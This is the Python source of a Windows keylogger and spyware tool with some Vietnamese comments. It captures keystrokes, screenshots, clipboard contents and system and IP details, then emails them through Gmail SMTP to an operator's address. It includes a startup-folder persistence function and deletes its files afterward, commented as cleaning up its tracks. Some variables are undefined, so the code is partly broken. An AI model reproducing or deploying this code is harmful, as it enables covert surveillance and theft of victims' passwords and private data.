from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import getpass
import numpy as np 
import cv2


from requests import get
import subprocess
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
	
system_information = "system.txt" #hệ thống

clipboard_information = "clipboard.txt" #clipboard
screenshot_information = "screenshot.png" #manhinh
keys_information = "key_log.txt" #keylogger


extend = "\\"



file_path =  "C://Users//Admin//Desktop//DEADLine python//New folder (3)//"

#time_iteration = 15 # 7200 # 2 hours #thời gian lặp lại
number_of_iterations_end = 2 # 5000  #so lan gui 

 

email_address = "" #your email
password = ""
email_address1 = "" #email you want to send

USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)





def send_email(filename, attachment):
    # Source code from geeksforgeeks.org

    fromaddr = email_address
    toaddr = email_address1

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Máy tính"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, password)

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()


			
	
	

	
	
	
	



# Get Computer and Network Information
def computer_information():
    with open(file_path + extend+ system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try : 
        	public_ip = get('https://api.ipify.org').text
        	f.write("Public IP Address: " + public_ip)
            
        except Exception:
            f.write("Couldn't get IP Address to do max query\n")    	

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()
send_email(system_information, file_path + extend + system_information)

# clipboard 
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")

# Screenshot 
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + 10 #time 10 is 10 giây #sau 10 giay tu dong gui lai all


while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # Send keylogger contents to email
        send_email(keys_information, file_path + extend + keys_information)
        # Clear contens of keylogger log file.
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        # Take a screenshot and send to email
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information)
        # Gather clipboard contents and send to email
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information)
        

        # Increase iteration by 1
        number_of_iterations += 1
        # Update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration






time.sleep(120) # Sleep two minutes before we delete all files

# Delete files - clean up our tracks
delete_files = [system_information, audio_information, clipboard_information, screenshot_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)

